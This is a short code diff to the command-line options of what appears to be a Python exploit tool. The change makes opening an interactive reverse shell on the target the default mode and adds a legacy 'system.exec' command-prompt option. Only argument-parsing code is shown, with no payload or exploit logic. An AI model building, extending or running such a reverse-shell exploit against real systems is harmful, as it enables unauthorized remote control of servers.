@@ -426,7 +426,9 @@ def main():
     mode.add_argument("-c", "--command", dest="command",
                       help="run one command instead of interactive mode")
     mode.add_argument("--revshell", "--reverse-shell", action="store_true",
-                      help="automatically open an interactive reverse shell")
+                      help="open an interactive reverse shell (default mode)")
+    mode.add_argument("--command-shell", action="store_true",
+                      help="use the legacy stateless system.exec command prompt")
     parser.add_argument("--revshell-port", "--reverse-shell-port", type=int,
                         help="reverse-shell port (default: reuse the proven replication port)")
     parser.add_argument("--check", action="store_true", help="fingerprint only; do not exploit")
@@ -446,7 +448,9 @@ def main():
     socket_timeout = options.timeout
     callback_timeout = options.callback_timeout
     one_command = options.command
-    reverse_shell_requested = options.revshell
+    reverse_shell_requested = options.revshell or (
+        not options.command and not options.command_shell and not options.check
+    )
     reverse_shell_port = options.revshell_port
     check_only = options.check
     no_cleanup = options.no_cleanup
